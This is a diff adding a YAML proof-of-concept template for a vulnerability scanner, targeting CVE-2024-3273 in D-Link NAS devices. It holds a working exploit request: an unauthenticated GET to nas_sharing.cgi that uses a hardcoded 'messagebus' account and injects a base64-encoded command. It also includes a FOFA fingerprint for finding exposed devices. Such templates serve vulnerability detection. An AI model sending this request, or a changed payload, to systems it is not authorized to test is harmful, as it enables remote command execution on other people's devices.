@@ -1,0 +1,18 @@
+id: poc-yaml-d-link-nas-sharing-cgi-rce
+info:
+  name: D-Link nas_sharing.cgi 远程代码执行漏洞(CVE-2024-3273)
+  severity: critical
+  tags:
+  - 两高一弱
+  - rce
+  - CVE-2024-3273
+  finger: d-link
+  fofa: body="Text:In order to access the ShareCenter"
+variables:
+  payload: base64("id")
+requests:
+- method: GET
+  path: /cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system={{.payload}}
+  expression: status_code == 200 && contains(body,"uid=") && contains(body,"gid=")
+    && contains(body,"<config><nas_sharing>") && !contains(headers,"Content-Type")
+transport: http
